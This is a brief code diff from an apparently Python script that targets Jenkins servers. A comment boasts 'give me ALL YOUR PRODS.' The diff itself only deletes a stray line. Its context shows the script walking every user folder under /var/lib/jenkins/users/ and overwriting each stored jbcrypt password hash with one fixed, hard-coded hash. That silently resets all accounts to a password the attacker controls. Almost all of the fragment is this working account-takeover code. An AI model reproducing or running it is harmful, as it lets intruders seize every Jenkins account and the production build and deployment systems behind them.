@@ -27,7 +27,6 @@ message = ""
 ##lololol give me ALL YOUR PRODS.
 r = re.compile(r"#jbcrypt:[^<]+")
 results = os.listdir('/var/lib/jenkins/users/')
-m
 for res in results:
         for line in fileinput.FileInput("/var/lib/jenkins/users/%s/config.xml" % res,inplace=1):
                 line = re.sub(r"#jbcrypt:[^<]+", "#jbcrypt:$2a$10$SV9laRf9CpzSp9ZV8HUWW.nRz8ZtBhEeIBlD/ekVHZdKmOCJHj4re", line )
